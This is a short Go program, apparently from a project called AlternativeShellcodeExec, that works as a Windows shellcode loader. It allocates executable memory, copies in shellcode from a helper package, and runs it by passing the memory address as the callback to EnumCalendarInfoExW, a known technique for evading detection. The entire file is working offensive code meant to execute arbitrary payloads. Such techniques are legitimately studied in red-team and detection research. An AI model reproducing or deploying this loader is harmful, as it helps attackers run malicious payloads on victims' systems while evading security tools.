package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
	LOCALE_USER_DEFAULT    = 0x0400
	ENUM_ALL_CALENDARS     = 0xffffffff
	CAL_SMONTHNAME1        = 0x00000038
)

var (
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc       = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory      = kernel32.NewProc("RtlMoveMemory")
	EnumCalendarInfoEx = kernel32.NewProc("EnumCalendarInfoExW")
)

func Run(op []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&op[0])), uintptr(len(op)))

	EnumCalendarInfoEx.Call(uintptr(addr), LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1)
}

func main() {
	Run(util.ShellCode())
}
